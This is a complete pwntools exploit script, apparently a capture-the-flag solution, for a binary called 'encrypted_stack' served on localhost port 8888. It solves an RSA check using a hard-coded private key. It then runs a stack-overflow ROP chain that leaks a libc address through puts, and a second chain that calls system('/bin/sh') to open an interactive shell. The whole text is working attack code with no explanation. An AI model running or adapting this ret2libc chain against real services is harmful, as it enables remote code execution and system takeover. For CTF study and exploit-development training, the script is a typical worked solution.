from pwn import *
from LibcSearcher import *

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-v']
elf = ELF('./encrypted_stack')
pop_rdi_addr = 0x40095a
vlun_addr = 0x40093a

N = 94576960329497431
p = 261571747
q = 361571773
phi = (p-1)*(q-1)
d = 26375682325297625

def powmod(a, b, m):
	if a == 0:
		return 0
	if b == 0:
		return 1
	res = powmod(a,b//2,m)
	res *= res
	res %= m
	if b&1:
		res *= a
		res %= m
	return res

def ans(sh):
	sh.recvuntil("it\n")
	for _ in range(20):
		c = int(sh.recvline())
		m = powmod(c, d, N)
		sh.sendline(str(m))
		sh.recvline()

def leak(sh, addr, presize):
	sh.recvuntil("name:\n")
	payload = flat(b'a' * presize, p64(pop_rdi_addr), p64(addr), p64(elf.plt['puts']), p64(vlun_addr))
	sh.sendline(payload)
	leaked = sh.recvuntil('\n')[:-1]
	while len(leaked) < 8:
		leaked += b'\x00'
	return u64(leaked)

sh = remote('127.0.0.1', '8888')
ans(sh)
libc_main_addr = leak(sh, elf.got['__libc_start_main'], 72)
print("WE GOT LIBC_MAIN_ADDR")
print(hex(libc_main_addr))

obj = LibcSearcher("__libc_start_main", libc_main_addr)
libc_main_offset = obj.dump('__libc_start_main')
system_offset = obj.dump('system')
sh_offset = obj.dump('str_bin_sh')

base_addr = libc_main_addr - libc_main_offset
system_addr = system_offset + base_addr
sh_addr = sh_offset + base_addr

payload = flat(b'a' * 72, p64(pop_rdi_addr), p64(sh_addr), p64(system_addr))
sh.sendline(payload)

sh.interactive()
